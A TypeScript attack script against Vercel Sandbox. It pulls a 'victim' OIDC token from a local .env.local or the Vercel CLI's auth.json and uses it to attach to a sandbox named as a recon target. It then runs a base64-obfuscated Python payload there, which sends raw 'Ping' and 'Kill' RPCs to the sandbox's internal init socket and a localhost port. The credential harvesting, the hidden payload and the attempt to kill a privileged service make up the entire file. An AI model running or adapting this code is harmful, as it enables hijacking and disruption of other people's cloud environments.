import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const B64 = "CmltcG9ydCBzb2NrZXQKCmRlZiBycGMocGF0aCwgbWV0aG9kLCBib2R5PWIne30nLCBjdHlwZT0nYXBwbGljYXRpb24vanNvbicsIHBvcnQ9Tm9uZSk6CiAgICBpZiBwb3J0OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5zZXR0aW1lb3V0KDIpCiAgICAgICAgcy5jb25uZWN0KCgnMTI3LjAuMC4xJywgcG9ydCkpCiAgICBlbHNlOgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9VTklYLCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5zZXR0aW1lb3V0KDIpCiAgICAgICAgcy5jb25uZWN0KHBhdGgpCiAgICByZXEgPSBiJ1BPU1QgL3ZlcmNlbC5zYW5kYm94LnNwYXduLnYxLlNwYXduU2VydmljZS8nICsgbWV0aG9kICsgYicgSFRUUC8xLjFcclxuSG9zdDogbG9jYWxob3N0XHJcbkNvbnRlbnQtVHlwZTogJyArIGN0eXBlLmVuY29kZSgpICsgYidcclxuQ29ubmVjdC1Qcm90b2NvbC1WZXJzaW9uOiAxXHJcbkNvbnRlbnQtTGVuZ3RoOiAnICsgc3RyKGxlbihib2R5KSkuZW5jb2RlKCkgKyBiJ1xyXG5cclxuJyArIGJvZHkKICAgIHMuc2VuZGFsbChyZXEpCiAgICBvdXQgPSBiJycKICAgIHRyeToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjID0gcy5yZWN2KDgxOTIpCiAgICAgICAgICAgIGlmIG5vdCBjOiBicmVhawogICAgICAgICAgICBvdXQgKz0gYwogICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OiBwYXNzCiAgICBzLmNsb3NlKCkKICAgIHJldHVybiBvdXQKCmZvciBtZXRob2QgaW4gW2InUGluZycsIGInS2lsbCddOgogICAgdHJ5OgogICAgICAgIHIgPSBycGMoJy9ydW4vdmVyY2VsL3NoYXJlL2luaXQuc29jaycsIG1ldGhvZCkKICAgICAgICBwcmludCgndW5peCcsIG1ldGhvZC5kZWNvZGUoKSwgJy0+JywgcmVwcihyWzozMDBdKSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgndW5peCcsIG1ldGhvZC5kZWNvZGUoKSwgJ0VSUicsIGUpCiAgICB0cnk6CiAgICAgICAgciA9IHJwYyhOb25lLCBtZXRob2QsIHBvcnQ9MjM0NTYpCiAgICAgICAgcHJpbnQoJ3RjcDIzNDU2JywgbWV0aG9kLmRlY29kZSgpLCAnLT4nLCByZXByKHJbOjMwMF0pKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCd0Y3AyMzQ1NicsIG1ldGhvZC5kZWNvZGUoKSwgJ0VSUicsIGUpCg==";
  const SCRIPT = `
set +e
echo "${B64}" | base64 -d > /tmp/probe4.py
timeout 20 python3 /tmp/probe4.py
echo "===DONE==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });